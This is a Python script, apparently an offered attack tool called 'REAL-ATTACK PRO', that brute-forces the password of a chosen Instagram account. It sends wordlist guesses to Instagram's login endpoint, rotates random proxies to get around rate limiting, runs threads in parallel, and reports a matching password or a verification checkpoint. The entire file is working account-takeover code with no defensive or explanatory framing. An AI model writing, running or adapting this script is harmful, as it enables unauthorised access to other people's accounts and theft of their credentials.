import requests, time, random, concurrent.futures
from rich.console import Console

console = Console()

def check_password(target, password, proxy_list):
    proxy = random.choice(proxy_list)
    proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    url = "https://www.instagram.com/accounts/login/ajax/"
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-csrftoken': 'missing',
        'x-ig-app-id': '936619743392459',
        'x-requested-with': 'XMLHttpRequest'
    }
    try:
        response = requests.post(url, data={'username': target, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}'}, headers=headers, proxies=proxies, timeout=5)
        if '"authenticated":true' in response.text:
            return ("SUCCESS", password)
        elif "checkpoint_required" in response.text:
            return ("CHECKPOINT", password)
        elif "Please wait" in response.text or response.status_code == 429:
            return ("BLOCKED", None)
        else:
            return ("WRONG", None)
    except:
        return ("ERROR", None)

def start_attack():
    console.print("[bold cyan]--- [ ABOOD_FAYOMI REAL-ATTACK PRO ] ---[/bold cyan]\n")
    target = input("[?] Target Username: ")
    
    try:
        with open("proxy.txt", "r") as f: proxies = [line.strip() for line in f if line.strip()]
        with open("target_passwords.txt", "r") as f: passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError as e:
        console.print(f"[bold red][!] Error: {e.filename} not found![/]")
        return

    console.print(f"\n[bold yellow][*] Attack Started: @{target} | Passwords: {len(passwords)} | Proxies: {len(proxies)}[/]\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_password, target, pwd, proxies): pwd for pwd in passwords}
        count = 0
        for future in concurrent.futures.as_completed(futures):
            status, pwd = future.result()
            count += 1
            if status == "SUCCESS":
                console.print(f"\n[bold green][MATCH] VALID PASSWORD FOUND: {pwd}[/]")
                return
            elif status == "CHECKPOINT":
                console.print(f"\n[bold yellow][!] CHECKPOINT FOUND: {pwd} (Account needs verification)[/]")
                return
            print(f"[*] Testing: {count}/{len(passwords)}", end="\r")

if __name__ == "__main__":
    start_attack()
